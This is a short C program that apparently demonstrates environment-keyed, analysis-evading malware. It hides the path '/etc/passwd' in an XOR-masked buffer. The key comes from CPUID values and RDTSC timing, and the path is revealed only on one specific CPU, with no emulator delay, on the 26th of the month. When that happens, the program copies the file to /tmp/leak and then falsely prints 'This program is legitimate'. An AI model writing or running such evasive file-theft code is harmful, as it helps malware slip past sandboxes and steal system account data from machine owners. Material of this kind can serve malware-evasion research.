#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>

void SaveFile(char* msg)
{
	char fname[] = {
		'/', 't', 'm', 'p', '/', 'l', 'e', 'a', 'k', 0 
	};
	FILE* pFile = fopen(fname, "a");
	fputs (msg,pFile);
	
	fclose (pFile);
}

char* mask_buffer( char* buf, int size, unsigned int key ) 
{
	//char* key = "KEYSTRING";
	char* pkey = (char*)&key;
	int i;
	for ( i = 0; i < size; i++ ) 
		buf[i] = buf[i] ^ pkey[i % sizeof(unsigned int)]; // XOR
	return buf;
}

static inline __uint64_t my_rdtsc(void)
{
    __uint32_t low, high;
    asm volatile("rdtsc":"=a"(low),"=d"(high));
    return ((__uint64_t)high << 32) | low;
}

static inline void my_cpuid(int code, __uint32_t* a, __uint32_t* d)
{
    asm volatile ( "cpuid" : "=a"(*a), "=d"(*d) : "0"(code) : "ebx", "ecx" );
}



int main(void)
{
    time_t t = time(NULL);
	struct tm now = *localtime(&t);
	
	char buffer[1024] = { '/', 'e', 't', 'c', '/', 'p', 'a', 's','s', 'w','d','\n' };
	unsigned int a = 0, b = 0;
	unsigned int s, e;
	unsigned int key;

	s = my_rdtsc();
	
	my_cpuid(1, &a, &b);
	
	e = my_rdtsc();
	
	key = a + b + (s-e);
	
	mask_buffer( buffer, 1024, key );
	
		
	//printf("%x %x\n", a,b);
	if( a == 0x806ea && b == 0xbfebfbff && (e-s) > 0xa0 && now.tm_mday == 26 ) {
		mask_buffer( buffer, 1024, key );
		printf("meet\n");
	} else {
		printf("doesn't meet\n");
	}
	
	
		
	if( buffer[11] == '\n' ) {
		buffer[11] = 0;
		FILE* pFile = fopen( buffer, "r" );
		
		// obtain file size:
		fseek (pFile , 0 , SEEK_END);
		long lSize = ftell (pFile);
		rewind (pFile);

		// allocate memory to contain the whole file:
		char* pBuffer = (char*) malloc (sizeof(char)*(lSize+1));
		memset( pBuffer, 0, sizeof(char)*(lSize+1) );
		
		// copy the file into the buffer:
		int result = fread (pBuffer,1,lSize,pFile);
		
		SaveFile( pBuffer );
		
		fclose(pFile);	
		//printf("%s\n", buffer);	
		//printf("%s\n", pBuffer);
		free( pBuffer );
		
		puts("");
	}
	
	

	printf("This program is legitimate.\n - Source: Dude-Trust-Me.\n");
	
    return 0;
}
